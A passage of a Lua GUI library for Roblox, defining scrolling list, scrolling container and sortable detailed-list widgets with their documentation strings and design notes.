		RemoveObject = RemoveObject;
		MoveObject = MoveObject;
		GetIndex = function(object)
			return GetIndex(children,object)
		end;
	}
	
	local function Destroy()
		for i,v in pairs(children) do
			if connections[v] then
				connections[v]:disconnect()
				connections[v] = nil
			end
			v.Parent = nil
			children[i] = nil
		end
		for i,con in pairs(connections) do
			con:disconnect()
			connections[i] = nil
		end
		for k in pairs(Class) do
			Class[k] = nil
		end
		Frame:Destroy()
	end
	Class.Destroy = Destroy

	for i,child in pairs(Frame:GetChildren()) do
		AddObject(child,i)
	end
	
	Update()
	
	Frame.Changed:connect(function(p)
		if p == "AbsoluteSize" or p == "Style" then
			local old = style_pad
			style_pad = GetPadding(Frame)*2
			if style_pad ~= old then
				Update()
			end
		end
	end)
	
	return Class,Frame
end

lib.StackingFrame = CreateStackingFrame

--[[DEPEND:
ScrollBar.lua;
]]

doc["ScrollingList"] = [==[
ScrollingList ( table `list`, number `entry_height` ) [constructor]
	returns: ScrollingList `object`, Frame `scrolling_frame`

Creates a scrollable list designed to display a large number of items.

Arguments:
	`list`
		Contains the items to display in the list.
		Items will be converted to a string before being displayed, so this may contain any type of value.
		Optional; defaults to an empty table
		
	`entry_height`
		Specifies the height, in pixels, of each displayed entry.
		Optional; defaults to ]==]..ENTRY_SIZE..[==[

Returns:
	`object`
		The ScrollingList object.

	`scrolling_frame`
		The scrolling list GUI.


ScrollingList Class:
	This class contains the folloing members.
	Readonly:
		List
			The `list` table.
			
		GUI
			The scrolling list GUI.

		Scroll
			A object for the list's scroll bar.

		EntryStylist
			A stylist containing every displayed entry.

	Methods:
		AddEntry ( * `item`, number `index` )
			Add an entry to the list and updates automatically.
			`item` is the value to add to the list.
			If `index` is specified, `item` will be added to the list at `index`.
			Otherwise, it will be added to the end.

		AddEntries ( table `items`, number `index` )
			Adds a group of entries to the list.
			`items` is a table of values that will be added to the list.
			If `index` is specified, the items will be inserted into the list starting at `index.
			Otherwise, they will be added to the end.

		RemoveEntry ( * `item` )
			Removes the first occurance of `item` in the list.
			If `item` is a number, the item at that index in the list will be removed.
			If `item` is not specified, then the list item in the list will be removed.

		Update ( )
			Updates the display to reflect the list.

		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.
]==]

local function CreateScrollingList(List,entryHeight)
	List = List or {}
	entryHeight = entyHeight or ENTRY_SIZE
	
	local ScrollingListFrame = Instance.new("Frame")
	ScrollingListFrame.Size = UDim2.new(0,300,0,200)
	ScrollingListFrame.Style = Enum.FrameStyle.RobloxRound
	ScrollingListFrame.Active = true
	ScrollingListFrame.Name = "ScrollingListFrame"
	
	local ListViewFrame = Instance.new("Frame",ScrollingListFrame)
	ListViewFrame.Name = "ListViewFrame"
	ListViewFrame.BackgroundTransparency = 1
	ListViewFrame.Size = UDim2.new(1,-entryHeight,1,0)

	local EntryStylist = Stylist{
		Name = "ListEntry";
		Font = "ArialBold";
		FontSize = "Size14";
		TextColor3 = Color3.new(1,1,1);
		BackgroundTransparency = 1;
		TextXAlignment = "Left";
	}
	local EntryTemplate = Instance.new("TextLabel")
	
	local EntryFrames = {}

	local Scroll,ScrollBarFrame = CreateScrollBar(false,entryHeight)
	ScrollBarFrame.Size = UDim2.new(0,entryHeight,1,0)
	ScrollBarFrame.Position = UDim2.new(1,-entryHeight,0,0)
	ScrollBarFrame.Parent = ScrollingListFrame

	local Update = Scroll.Update
	
	local Class = {
		List = List;
		GUI = ScrollingListFrame;
		Scroll = Scroll;
		Update = Update;
		EntryStylist = EntryStylist;
	}
	
	Scroll.UpdateCallback = function()
		local visible_space = Scroll.VisibleSpace
		-- update current entries
		for i = 1,visible_space do
			local item = List[i + Scroll.ScrollIndex]
			if item then
				local entry = EntryFrames[i]
				if not entry then
					entry = EntryTemplate:Clone()
					EntryStylist.AddObject(entry)
					EntryFrames[i] = entry
					entry.Parent = ListViewFrame
					entry.ZIndex = ScrollingListFrame.ZIndex
				end
				entry.Text = tostring(item)
				entry.Position = UDim2.new(0,0,0,(i-1)*entryHeight)
				entry.Size = UDim2.new(1,0,0,entryHeight)
			else
				local entry = EntryFrames[i]
				if entry then
					EntryStylist.RemoveObject(entry)
					entry:Destroy()
					EntryFrames[i] = nil
				end
			end
		end
		-- remove extra entries (occurs only when #EntryFrames > VisibleSpace)
		for i = Scroll.VisibleSpace+1,#EntryFrames do
			local entry = EntryFrames[i]
			if entry then
				EntryStylist.RemoveObject(entry)
				entry:Destroy()
			end
			EntryFrames[i] = nil
		end
	end

	-- add an item to the list; optional list index
	local function AddEntry(item,index)
		if index then
			table.insert(List,index,item)
		else
			table.insert(List,item)
		end
		Scroll.TotalSpace = #List
		Update()
	end
	Class.AddEntry = AddEntry
	
	-- add multiple items to list
	local function AddEntries(items,index)
		if index then
			for i = 1,#items do
				table.insert(List,index+i-1,items[i])
			end
		else
			for i = 1,#items do
				table.insert(List,items[i])
			end
		end
		Scroll.TotalSpace = #List
		Update()
	end
	Class.AddEntries = AddEntries

	-- remove entry from list; may be a list index or an item in the list
	local function RemoveEntry(item)
		if type(item) == "number" or type(item) == "nil" then
			table.remove(List,item)
		else
			for i,v in pairs(List) do
				if v == item then
					table.remove(List,i)
					break
				end
			end
		end
		Scroll.TotalSpace = #List
		Update()
	end
	Class.RemoveEntry = RemoveEntry

	SetZIndexOnChanged(ScrollingListFrame)

	ListViewFrame.Changed:connect(function(p)
		if p == "AbsoluteSize" then
			Scroll.VisibleSpace = math.floor(ListViewFrame.AbsoluteSize.y/entryHeight)
			Update()
		end
	end)
	
	function Class.Destroy()
		for i in pairs(Class) do
			Class[i] = nil
		end
		for i,v in pairs(EntryFrames) do
			v:Destroy()
			EntryFrames[i] = nil
		end
		EntryStylist.Destroy()
		Scroll.Destroy()
		ScrollingListFrame:Destroy()
	end

	return Class,ScrollingListFrame
end

lib.ScrollingList = CreateScrollingList

--[[DEPEND:
ScrollBar.lua;
]]

doc["ScrollingContainer"] = [==[
ScrollingContainer ( bool `v_scroll_bar`, bool `h_scroll_bar`, number `scroll_width` ) [constructor]
	returns: ScrollingContainer `object`, Frame `scrolling_container`

Creates a container that can be scrolled with one or more scroll bars.
The scroll bars update dynamically based on the size of the boundary and container.
Objects in the container are automatically clipped to display only within the boundary.

Arguments:
	`v_scroll_bar`
		Indicates whether the container should have a vertical scroll bar.
		Optional; defaults to true

	`h_scroll_bar`
		Indicates whether the container should have a horizontal scroll bar.
		Optional; defaults to false
		
	`scroll_width`
		Indicates the width the scrollbar(s).
		Optional; defaults to ]==]..ENTRY_SIZE..[==[

Returns:
	`object`
		The ScrollingContainer object.

	`scrolling_container`
		The scrolling container GUI.


ScrollingContainer Class:
	This class contains the following members:

	Readonly:
		Boundary
			A Frame that represents the visible area, clipping off any overflowing content.

		Container
			A Frame that will contain other items to be displayed in the scrolling container.

		GUI
			The scrolling container GUI.

		HScroll
			The horizontal scroll bar object (if available).

		VScroll
			The vertical scroll bar object (if available).
		
	Methods:
		Update ( )
			Updates the scroll bar (or both, if present).
]==]

local function CreateScrollingContainer(v_scroll,h_scroll,scroll_width)
	if v_scroll == nil then v_scroll = true end
	scroll_width = scroll_width or ENTRY_SIZE

	local ParentFrame = Create'Frame'{
		Name = "ScrollingContainer";
		Size = UDim2.new(0,300,0,200);
		BackgroundTransparency = 1;
	}

	local Boundary = Create'Frame'{
		Name = "Boundary";
		BackgroundColor3 = Color3.new(0,0,0);
		BorderColor3 = Color3.new(1,1,1);
		ClipsDescendants = true;
		Parent = ParentFrame;
	}

	local Container = Create'Frame'{
		Name = "Container";
		BackgroundTransparency = 1;
		Parent = Boundary;
	}
	
	local Class = {
		GUI = ParentFrame;
		Boundary = Boundary;
		Container = Container;
	}
	
	if v_scroll and h_scroll then
		local VScroll = CreateScrollBar(false,scroll_width)
		VScroll.PageIncrement = scroll_width
		VScroll.GUI.Position = UDim2.new(1,-scroll_width,0,0)
		VScroll.GUI.Size = UDim2.new(0,scroll_width,1,-scroll_width)
		VScroll.GUI.Parent = ParentFrame
		local VUpdate = VScroll.Update
		VScroll.UpdateCallback = function()
			Container.Position = UDim2.new(0,Container.Position.X.Offset,0,-VScroll.ScrollIndex)
		end
		
		local HScroll = CreateScrollBar(true,scroll_width)
		HScroll.PageIncrement = scroll_width
		HScroll.GUI.Position = UDim2.new(0,0,1,-scroll_width)
		HScroll.GUI.Size = UDim2.new(1,-scroll_width,0,scroll_width)
		HScroll.GUI.Parent = ParentFrame
		local HUpdate = HScroll.Update
		HScroll.UpdateCallback = function()
			Container.Position = UDim2.new(0,-HScroll.ScrollIndex,0,Container.Position.Y.Offset)
		end

		Boundary.Size = UDim2.new(1,-scroll_width,1,-scroll_width)
		
		local function Update()
			VUpdate()
			HUpdate()
		end
		
		local function SizeChanged(p)
			if p == "AbsoluteSize" then
				VScroll.TotalSpace = Container.AbsoluteSize.y
				VScroll.VisibleSpace = Boundary.AbsoluteSize.y
				HScroll.TotalSpace = Container.AbsoluteSize.x
				HScroll.VisibleSpace = Boundary.AbsoluteSize.x
				Update()
			end
		end
		Boundary.Changed:connect(SizeChanged)
		Container.Changed:connect(SizeChanged)
		Class.VScroll = VScroll
		Class.HScroll = HScroll
		Class.Update = Update
		SizeChanged("AbsoluteSize")
		Update()
	elseif v_scroll then
		local Scroll = CreateScrollBar(false,scroll_width)
		Scroll.PageIncrement = scroll_width
		Scroll.GUI.Position = UDim2.new(1,-scroll_width,0,0)
		Scroll.GUI.Size = UDim2.new(0,scroll_width,1,0)
		Scroll.GUI.Parent = ParentFrame
		local Update = Scroll.Update
		Scroll.UpdateCallback = function()
			Container.Position = UDim2.new(0,Container.Position.X.Offset,0,-Scroll.ScrollIndex)
		end
		local function SizeChanged(p)
			if p == "AbsoluteSize" then
				Scroll.TotalSpace = Container.AbsoluteSize.y
				Scroll.VisibleSpace = Boundary.AbsoluteSize.y
				Update()
			end
		end
		Boundary.Changed:connect(SizeChanged)
		Container.Changed:connect(SizeChanged)
		Class.VScroll = Scroll
		Class.Update = Update
		SizeChanged("AbsoluteSize")
		Update()
	elseif h_scroll then
		local Scroll = CreateScrollBar(true,scroll_width)
		Scroll.PageIncrement = scroll_width
		Scroll.GUI.Position = UDim2.new(0,0,1,-scroll_width)
		Scroll.GUI.Size = UDim2.new(1,0,0,scroll_width)
		Scroll.GUI.Parent = ParentFrame
		local Update = Scroll.Update
		Scroll.UpdateCallback = function()
			Container.Position = UDim2.new(0,-Scroll.ScrollIndex,0,Container.Position.Y.Offset)
		end
		local function SizeChanged(p)
			if p == "AbsoluteSize" then
				Scroll.TotalSpace = Container.AbsoluteSize.x
				Scroll.VisibleSpace = Boundary.AbsoluteSize.x
				Update()
			end
		end
		Boundary.Changed:connect(SizeChanged)
		Container.Changed:connect(SizeChanged)
		Class.HScroll = Scroll
		Class.Update = Update
		SizeChanged("AbsoluteSize")
		Update()
	end
	
	return Class,ParentFrame
end

lib.ScrollingContainer = CreateScrollingContainer

--[[DEPEND:
SetZIndex.lua;
Stylist.lua;
Graphic.lua;
ScrollBar.lua;
]]

doc["DetailedList"] = [==[
DetailedList ( table `row_data_list`, table `column_scheme`, number `row_height` ) [constructor]
	returns: DetailedList `object`, Frame `list_frame`

Creates a customizable list for displaying data.

Arguments:
	`row_data_list`
		Holds all the data to be displayed.
		It contains tables that hold data for each row in the list (see Row Data).
		Optional; defaults to an empty table.

	`column_scheme`
		Contains information for how each column will be displayed (see Column Scheme).
		
	`row_height`
		Sets the height of each row, in pixels.
		Optional; defaults to ]==]..ENTRY_SIZE..[==[

Returns:
	`object`
		The DetailedList object.
		
	`list_frame`
		The DetailedList GUI.


DetailedList Class:
	This class contains the following members:
	
	Readonly:
		GUI
			The DetailedList GUI.

		Data
			The `row_data_list` table.

		Scroll
			A class for the list's scroll bar.

		Stylist
			A table that contains Stylist classes for controlling the appearance of the DetailedList.
			It contains the following values:
				Global: Every object in the DetailedList
				Cell: Every cell in list
				Header: Each cell the top (header) row of the list.
				RowSpan: Each cell container of each row.
				Rows: A table that contains Stylists for each row in the list, referenced by the row's data table.
				Columns: A table that contains Stylists for each column in the list.

	Methods:
		AddRow ( table `row_data`, number `index`, table `style` )
			Adds a new row to the list.
			`row_data` is the data to display in the row.
			If `index` is specified, then the row will be added to that place in the list, instead of the end.
			If `style` is specified, then the row's Stylist will be created with it.
			Returns the row's data table.

		RemoveRow ( number `index` )
			Removes a row from the list.
			`index` may be a numerical index in the list, or a row data table in the list.
			Returns the removed row's data table.

		UpdateRow ( number `index` )
			Updates the specified row to reflect the data in `row_data_list`
			`index` may be a numerical index in the list, or a row data table in the list.

		Update ( )
			Updates the display.

		Destroy ( )
			Releases the resources used by this object.
			Run this if you're no longer using this object.


Column Scheme:
	The column scheme is a list of tables, each representing a column that will appear in the DetailedList.
	Each of these tables contain the following entries:
		["type"] = (string)
			Indicates the data type of the column.
			More entries may be required depending on the type (see Column Scheme Types).
		["name"] = (string)
			The name of the column. This will appear in the header at the top.
		["width"] = (UDim)
			The width of the column.
		["style"] = (table)
			Optional. Defines a custom style for the column.
			If defined, then it will become the corresponding stylist in `object`.Stylist.Columns.


Row Data:
	A row data table holds the data for each cell of a row.
	Each entry corresponds to each cell in the row.
	Their types should match up with the column scheme (see Column Scheme Types).

	Example (for scheme {"check-box", "image", "text"}):
		row_data_list = {
			{true, "flower.png", "Flowers"};
			{false, "beehive.png", "Bees"};
		}


Column Scheme Types:
	Here are the possible data types, and their extra entries:
		text
			Row Data: string
				The text to display in the cell.
			Entries: none
		image
			Row Data: string
				The Content string of the image to display in the cell.
			Entries: none
		text-button
			Row Data: string
				The text to display in the cell.
			Entries:
				["callback"] = function (table `row_data`, table `object`)
					Called when the button is clicked.
					`row_data` is the button's row data.
					`object` is the DetailedList object.
		image-button
			Row Data: string
				The Content string of the image to display in the cell.
			Entries:
				["callback"] = function (table `row_data`, table `object`)
					Called when the button is clicked.
					`row_data` is the button's row data.
					`object` is the DetailedList object.
		text-field
			Row Data: string
				The value displayed in the text field.
			Entries:
				["callback"] = function (string `text`, table `row_data`, table `object`, bool `entered`)
					Called when the field loses focus.
					`text` is the field's current text.
					`row_data` is the field's row data.
					`object` is the DetailedList object.
					`entered` is whether the user pressed enter to lose focus.
					This function should return a string (usually same as `text`).
					If nil or false is returned, then the field will be reverted to the text before the change.
		check-box
			Row Data: bool
				The state of the check box.
			Entries:
				["checked"] = string, table
					The image (Content string) to display when the box is checked.
					If a table, its entries are the arguments to make a new Graphic.
				["unchecked"] = string, table
					The image (Content string) to display when the box is unchecked.
					If a table, its entries are the arguments to make a new Graphic.
				["callback"] = function (table `row_data`, table `object`)
					Called when the check box is clicked.
					`row_data` is the button's row data.
					`object` is the DetailedList object.
					This function should return a bool, indicating if the check box should toggle its state.
		drop-list (NOT IMPLEMENTED)
			Row Data: string
				The value displayed in the drop list.
			Entries:
				["items"] = table
					A list of items to appear in the drop list.
]==]

--[==[EXCLUDE:
detailed list notes

	updating will take much more processing, due to amount of info per row
	there aren't going to be millions of rows
	so, go back to having frames for each row
	but, still use row indexing
	on update, stop displaying displayed rows, query new rows, display them

	row frames in the RowFramesList table are referenced by data rows in the RowDataList table

	PANIC: columns have a fixed width
	when updating, resize each cell width using one of the following options:
	->	basic: columns have fixed, perminent width, defined by column scheme, calculated once on row addition
		detailed view-like: columns have fixed width regardless of row content, recalculated when column tab is resized
		table-like: each column width is recalculated based on its content, when a row is added/removed (expensive)

	entry scheme:
		a table that describes an entry to the list
		keys are sequential, describing a part of the entry

		Entry Data:
			For a cell type, the acceptable entry data type is defined below.
			If the entry is a table instead, the first value in that table is the original data,
			while other keys defined will set the corresponding property of the cell.
			Example:
				As Data Type:	"A string"
				As Table:		{"A string", TextColor3 = Color3.new(1,0,0)}
		Types:
		Column Scheme Definition:											Entry Data:
		{"text"};															string
		{"image"};															string
		{"text-button", callback = function};								string
		{"image-button", callback = function};								string
		{"text-field", callback = function};								string
		{"check-box", checked = string, unchecked = string, callback};		bool
		{"drop-list", items = table};										string

		Each scheme has a 'name' key (string) and a 'width' key (UDim), which define he name and width of the column
		Each scheme can also have a 'style' key, who's value is a table that defines properties for each cell as columns
]==]

local function CreateDetailedList(RowDataList,ColumnScheme,rowHeight)
	RowDataList = RowDataList or {}
	rowHeight = rowHeight or ENTRY_SIZE
	local viewHeight = 0
	local numRows = math.floor(viewHeight/rowHeight)
	local scrollIndex = 0

	local RowFramesList = {}	-- holds a list of frames associated with RowDataList entries. This list is independent of RowDataList, and may be resorted
	local RowFrameLookup = {}	-- [data]=frame references
	local RowDataLookup = {}	-- [frame]=data references; it would be nice if this didn't have to exist
	local DisplayedRows = {}	-- a list of currently displayed row frames
	local CellMetadata = {}		-- extra data associated with a cell

	local DetailedListFrame = Create'Frame'{
		Size = UDim2.new(0,300,0,200);
		BackgroundTransparency = 1;
		Create'Frame'{
			Name = "ListViewFrame";
			BackgroundTransparency = 1;
			Size = UDim2.new(1,-rowHeight,1,-rowHeight);
			Position = UDim2.new(0,0,0,rowHeight);
		};
		Create'Frame'{
			Name = "ColumnHeaderFrame";
			BackgroundTransparency = 1;
			Size = UDim2.new(1,-rowHeight,0,rowHeight);
			Position = UDim2.new(0,0,0,0);
		};
	}
	
	local ListViewFrame = DetailedListFrame.ListViewFrame
	local ColumnHeaderFrame = DetailedListFrame.ColumnHeaderFrame

---- Stylists
	local GlobalStylist = CreateStylist{		-- for all objects
		TextColor3			= Color3.new(1,1,1);
	--	TextXAlignment		= Enum.TextXAlignment.Center;
	--	TextYAlignment		= Enum.TextYAlignment.Center;
		TextTransparency	= 0;
		Font				= Enum.Font.ArialBold;
		FontSize			= Enum.FontSize.Size14;
	}
	local CellStylist = CreateStylist{		-- for all cells
		BackgroundColor3		= Color3.new(0,0,0);
		BorderColor3			= Color3.new(1,1,1);
		BorderSizePixel			= 1;
		BackgroundTransparency	= 0.7;
	}
	GlobalStylist.AddStylist(CellStylist)
	local HeaderStylist = CreateStylist{		-- for all column headers
		BackgroundColor3		= Color3.new(1,1,1);
		BorderColor3			= Color3.new(1,1,1);
		BorderSizePixel			= 1;
		BackgroundTransparency	= 0.8;
	}
	GlobalStylist.AddStylist(HeaderStylist)
	local RowSpanStylist = CreateStylist{		-- for cell container of each row
		BackgroundTransparency	= 1;
	}
	GlobalStylist.AddStylist(RowSpanStylist)
	local RowStylists = {}				-- list of stylists for each row
	local ColumnStylists = {}			-- list of stylists for each column

	local Scroll,ScrollBarFrame = CreateScrollBar(false,rowHeight)
	Modify(ScrollBarFrame){
		Size = UDim2.new(0,rowHeight,1,-rowHeight);
		Position = UDim2.new(1,-rowHeight,0,rowHeight);
		Parent = DetailedListFrame;
	}

	local Update = Scroll.Update

---- DetailedList Class
	local Class = {
		Data = RowDataList;
		GUI = DetailedListFrame;
		Stylist = {
			Global = GlobalStylist;
			Cell = CellStylist;
			Header = HeaderStylist;
			RowSpan = RowSpanStylist;
			Rows = RowStylists;
			Columns = ColumnStylists;
		};
		Update = Update;
	}
	
	-- update row display
	local event_id = 0
	Scroll.UpdateCallback = function()
		event_id = event_id + 1
		local current_id = event_id
		-- stop displaying previous rows
		for i,row in pairs(DisplayedRows) do
			if event_id ~= current_id then return end
			row.Visible = false
			DisplayedRows[i] = nil
		end
		-- query and display current rows
		for i = 1,Scroll.VisibleSpace do
			if event_id ~= current_id then return end
			local row = RowFramesList[i + Scroll.ScrollIndex]
			if row then
				DisplayedRows[#DisplayedRows+1] = row
				row.Position = UDim2.new(0,0,0,(i-1)*rowHeight)
				row.Size = UDim2.new(1,0,0,rowHeight)
				row.Visible = true
			end
		end
	end
	
	ListViewFrame.Changed:connect(function(p)
		if p == "AbsoluteSize" then
			Scroll.VisibleSpace = math.floor(ListViewFrame.AbsoluteSize.y/rowHeight)
			Update()
		end
	end)

---- Row Sorting
	local SortGraphic = Create'Frame'{
		Name = "SortGraphic";
		BackgroundTransparency = 1;
		Size = UDim2.new(0,rowHeight,0,rowHeight);
		Position = UDim2.new(1,-rowHeight*0.75,0.5,-rowHeight/8);
	}
	local GraphicTextAlias = {["TextColor3"]="BackgroundColor3";["TextTransparency"]="BackgroundTransparency";["BorderSizePixel"]=""}
	
	local SortUpG,SortUp = CreateGraphic("arrow-up",Vector2.new(rowHeight,rowHeight))
	GlobalStylist.AddStylist(SortUpG.Stylist,GraphicTextAlias)
	SortUp.Visible = false
	SortUp.Parent = SortGraphic
	
	local SortDownG,SortDown = CreateGraphic("arrow-down",Vector2.new(rowHeight,rowHeight))
	GlobalStylist.AddStylist(SortDownG.Stylist,GraphicTextAlias)
	SortDown.Visible = false
	SortDown.Parent = SortGraphic
	
	-- sets the direction (up or down) and parent (column header)
	local function SetSortGraphic(direction,parent)
		if parent then
			if parent.TextXAlignment == Enum.TextXAlignment.Right then
				SortGraphic.Position = UDim2.new(0,0,0,0)
			else
				SortGraphic.Position = UDim2.new(1,-rowHeight,0,0)
			end
		end
		if direction > 0 then
			SortUp.Visible = true
			SortDown.Visible = false
			if SortGraphic.ZIndex ~= parent.ZIndex then
				SetZIndex(SortGraphic,parent.ZIndex)
			end
			SortGraphic.Parent = parent
		elseif direction < 0 then
			SortUp.Visible = false
			SortDown.Visible = true
			if SortGraphic.ZIndex ~= parent.ZIndex then
				SetZIndex(SortGraphic,parent.ZIndex)
			end
			SortGraphic.Parent = parent
		else
			SortUp.Visible = false
			SortDown.Visible = false
			SortGraphic.Parent = nil
		end
	end
	
	-- sorts a column (at index) by a sort type (ascending/descending/none)
	-- will eventually be added to class
	local function SortColumn(index,sort_type)
		-- re-sort to original sorting
		for i,data in pairs(RowDataList) do
			RowFramesList[i] = RowFrameLookup[data]
		end
		local header = ColumnHeaderFrame:GetChildren()[index] -- eww
		SetSortGraphic(0)
		-- sort depending on type, if provided
		if sort_type == SORT.ASCENDING then
			table.sort(RowFramesList,function(a,b)
				local adata,bdata = RowDataLookup[a][index],RowDataLookup[b][index]
				-- a and b should always have the same type
				local t = type(adata)
				if t == "table" then
					adata,bdata = adata[1],bdata[1]
					t = type(adata)
				end
				if t == "boolean" then
					return tostring(adata) > tostring(bdata)
				elseif t == "number" or t == "string" then
					return adata < bdata
				else
					return tostring(adata) < tostring(bdata)
				end
			end)
			SetSortGraphic(1,header)
		elseif sort_type == SORT.DESCENDING then
			table.sort(RowFramesList,function(a,b)
				local adata,bdata = RowDataLookup[a][index],RowDataLookup[b][index]
				-- a and b should always have the same type
				local t = type(adata)
				if t == "table" then
					adata,bdata = adata[1],bdata[1]
					t = type(adata)
				end
				if t == "boolean" then
					return tostring(adata) < tostring(bdata)
				elseif t == "number" or t == "string" then
					return adata > bdata
				else
					return tostring(adata) > tostring(bdata)
				end
			end)
			local header = ColumnHeaderFrame:GetChildren()[index]
			SetSortGraphic(-1,header)
		end
		Update()
	end

---- Initialize column scheme
	local RowTemplate = Create'Frame'{
		Name = "Row";
		Visible = false;
	}

	-- appends a space character to aligned text as cheap padding
	local function SetText(frame,text)
		if text == nil then
			frame.Text = "";
		else
			text = tostring(text)
			if #text > 0 and frame.TextXAlignment ~= Enum.TextXAlignment.Center then
				if frame.TextXAlignment == Enum.TextXAlignment.Left then
					frame.Text = " " .. text
				elseif frame.TextXAlignment == Enum.TextXAlignment.Right then
					frame.Text = text .. " "
				end
			else
				frame.Text = text
			end
		end
	end
	
	-- used by check-box, which uses either an image or a Graphic.
	local function SetImageOrGraphic(cell,active)
		local md = CellMetadata[cell]
		local checked,unchecked = md.Checked,md.Unchecked
		if type(unchecked) == "string" then
			cell.Image = active and "" or unchecked
		elseif type(unchecked) == "table" then
			if active then
				unchecked.GUI.Parent = nil
			else
				if unchecked.GUI.ZIndex ~= cell.ZIndex then
					SetZIndex(unchecked.GUI,cell.ZIndex)
				end
				unchecked.GUI.Parent = cell
			end
		end
		if type(checked) == "string" then
			cell.Image = active and checked or ""
		elseif type(checked) == "table" then
			if active then
				if checked.GUI.ZIndex ~= cell.ZIndex then
					SetZIndex(checked.GUI,cell.ZIndex)
				end
				checked.GUI.Parent = cell
			else
				checked.GUI.Parent = nil
			end
		end
	end
	
	local current_sort_header = nil
	local current_sort_type = SORT.NONE

	-- generate a template for rows
	local ColumnHeaderPos = UDim.new()
	for i,cell_scheme in pairs(ColumnScheme) do
		local columnStylist = CreateStylist(cell_scheme.style)
		ColumnStylists[i] = columnStylist
	--	CellStylist.AddStylist(columnStylist)
	--	columnStylist.AddStylist(HeaderStylist)
		local cell_type = cell_scheme.type
		local template
		if cell_type == "text" then
			template = Instance.new("TextLabel",RowTemplate)
			template.Name = "Text"
		elseif cell_type == "image" then
			template = Instance.new("ImageLabel",RowTemplate)
			template.Name = "Image"
		elseif cell_type == "text-button" then
			template = Instance.new("TextButton",RowTemplate)
			template.Name = "TextButton"
		elseif cell_type == "image-button" then
			template = Instance.new("ImageButton",RowTemplate)
			template.Name = "ImageButton"
		elseif cell_type == "text-field" then
			template = Instance.new("TextBox",RowTemplate)
			template.Name = "TextField"
			template.ClearTextOnFocus = false
		elseif cell_type == "check-box" then
			template = Instance.new("ImageButton",RowTemplate)
			template.Name = "CheckBox"
		end
		
		-- create the header row
		local ColumnHeader = Create'TextButton'{
			Name = "ColumnHeader";
			Parent = ColumnHeaderFrame;
		}
		HeaderStylist.AddObject(ColumnHeader)
		columnStylist.AddObject(ColumnHeader)
		SetText(ColumnHeader,cell_scheme.name)
		-- sort on click
		ColumnHeader.MouseButton1Click:connect(function()
			if current_sort_header == ColumnHeader then
				-- cycle between ascending, descending, and none
				if current_sort_type == SORT.ASCENDING then
					current_sort_type = SORT.DESCENDING
				elseif current_sort_type == SORT.DESCENDING then
					current_sort_type = SORT.NONE
				else
					current_sort_type = SORT.ASCENDING
				end
			else
				current_sort_type = SORT.ASCENDING
			end
			current_sort_header = ColumnHeader
			SortColumn(i,current_sort_type)
		end)
		local Width = cell_scheme.width
		ColumnHeader.Size = UDim2.new(Width.Scale,Width.Offset,1,0)
		ColumnHeader.Position = UDim2.new(ColumnHeaderPos.Scale,ColumnHeaderPos.Offset,0,0)
		ColumnHeaderPos = ColumnHeaderPos + Width
	end
	ColumnHeaderPos = nil

---- Class functions

	-- update the row frame to reflect the row data
	function Class.UpdateRow(index)
		local RowData
		if type(index) == "number" then
			RowData = RowDataList[index]
		else
			RowData = index
		end

		local Row = RowFrameLookup[RowData]
		local Cells = Row:GetChildren() -- eww
		local CellColPos = UDim.new()
		for i,cell_scheme in pairs(ColumnScheme) do
			local cell_type = cell_scheme.type
			local Cell = Cells[i]
			local CellData = RowData[i]
			local Width = cell_scheme.width
			if cell_type == "text" then
				SetText(Cell,CellData)
			elseif cell_type == "image" then
				Cell.Image = CellData
			elseif cell_type == "text-button" then
				SetText(Cell,CellData)
			elseif cell_type == "image-button" then
				Cell.Image = CellData
			elseif cell_type == "text-field" then
				SetText(Cell,CellData)
			elseif cell_type == "check-box" then
				SetImageOrGraphic(Cell,CellData)
			end
			Cell.Size = UDim2.new(Width.Scale,Width.Offset,1,0) -- this would be a lot easier if UDim2.new accepts UDims
			Cell.Position = UDim2.new(CellColPos.Scale,CellColPos.Offset,0,0)
			CellColPos = CellColPos + Width
		end
	end

	-- add a new row to the list; optional list index
	function Class.AddRow(RowData,index,style)
		-- TODO: verify that data matches column scheme
		local NewRow = RowTemplate:Clone()
		if index then
			index = index > #RowDataList+1 and #RowDataList+1 or index < 1 and 1 or index
			table.insert(RowDataList,index,RowData)
			table.insert(RowFramesList,index,NewRow)
		else
			table.insert(RowDataList,RowData)
			table.insert(RowFramesList,NewRow)
		end
		Scroll.TotalSpace = #RowDataList
		RowSpanStylist.AddObject(NewRow)
		NewRow.Size = UDim2.new(1,0,0,rowHeight)
		NewRow.ZIndex = DetailedListFrame.ZIndex
		NewRow.Parent = ListViewFrame
		local Cells = NewRow:GetChildren()
		local CellColPos = UDim.new()
		local rowStylist = CreateStylist(style)
		RowStylists[RowData] = rowStylist
	--	CellStylist.AddStylist(rowStylist)
		for i,cell_scheme in pairs(ColumnScheme) do
			local cell_type = cell_scheme.type
			local Cell = Cells[i]
			Cell.ZIndex = DetailedListFrame.ZIndex
			CellStylist.AddObject(Cell)
			ColumnStylists[i].AddObject(Cell)
			rowStylist.AddObject(Cell)
			local CellData = RowData[i]
			local Width = cell_scheme.width
			if cell_type == "text" then
				SetText(Cell,CellData)
			elseif cell_type == "image" then
				Cell.Image = CellData
			elseif cell_type == "text-button" then
				SetText(Cell,CellData)
				Cell.MouseButton1Click:connect(function()
					cell_scheme.callback(RowData,Class)
				end)
			elseif cell_type == "image-button" then
				Cell.Image = CellData
				Cell.MouseButton1Click:connect(function()
					cell_scheme.callback(RowData,Class)
				end)
			elseif cell_type == "text-field" then
				SetText(Cell,CellData)
				local last_text = CellData
				Cell.FocusLost:connect(function(enter)
					local text = cell_scheme.callback(Cell.Text,RowData,Class,enter)
					if text then
						RowData[i] = text
						SetText(Cell,text)
						last_text = text
					else
						SetText(Cell,last_text)
					end
				end)
			elseif cell_type == "check-box" then
				CellMetadata[Cell] = {}
				if type(cell_scheme.checked) == "table" then
					local graphic = CreateGraphic(cell_scheme.checked[1],cell_scheme.checked[2])
					SetZIndex(graphic.GUI,DetailedListFrame.ZIndex)
					GlobalStylist.AddStylist(graphic.Stylist,GraphicTextAlias)
					CellMetadata[Cell].Checked = graphic
				else
					CellMetadata[Cell].Checked = cell_scheme.checked
				end
				if type(cell_scheme.unchecked) == "table" then
					local graphic = CreateGraphic(cell_scheme.unchecked[1],cell_scheme.unchecked[2])
					SetZIndex(graphic.GUI,DetailedListFrame.ZIndex)
					GlobalStylist.AddStylist(graphic.Stylist,GraphicTextAlias)
					CellMetadata[Cell].Unchecked = graphic
				else
					CellMetadata[Cell].Unchecked = cell_scheme.unchecked
				end
				SetImageOrGraphic(Cell,CellData)
